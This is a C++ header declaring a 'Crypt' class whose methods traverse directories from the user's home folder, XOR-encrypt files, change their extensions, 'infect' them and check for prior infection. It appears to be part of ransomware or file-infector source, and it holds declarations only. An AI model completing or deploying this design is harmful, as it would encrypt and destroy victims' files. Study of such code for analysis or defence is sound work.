#pragma once
#include "Recon.h"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <minwindef.h>
#include <string>
#include <vector>
#include <Windows.h>

namespace fs = std::filesystem;

//typedef BOOL(WINAPI* MoveFileA_t)(
//	LPCSTR lpExistingFileName, 
//	LPCSTR lpNewFileName);

class Crypt {
public:
	Crypt(const std::wstring &targetPath);
	VOID StartCrypt();
	static std::string encryptCaesar(std::vector<unsigned char>& encrypted_data, int key);
	//static std::string decryptCaesar(std::vector<unsigned char> &encrypted_data, int key);
	//std::vector<char> encrypt_bytes(const fs::directory_entry& file);
private:
	Recon recon;
	char key = 0x33;

	//std::wstring startingPath = recon.getHomeFolder() + L"\\testing";
	//std::wstring startingPath = recon.getHomeFolder();
	VOID _traverse_directory(const std::wstring& folderPath); 
	VOID XORCryptFile(const fs::directory_entry& file);
	VOID _change_extension(const fs::directory_entry& file);
	VOID _infect_file(const fs::directory_entry& file);
	BOOL _is_file_infected(const fs::directory_entry& file);
	std::vector<char> encryptBytes(const fs::directory_entry& file);
	std::string _decryptString(const std::string& encryptedString);
};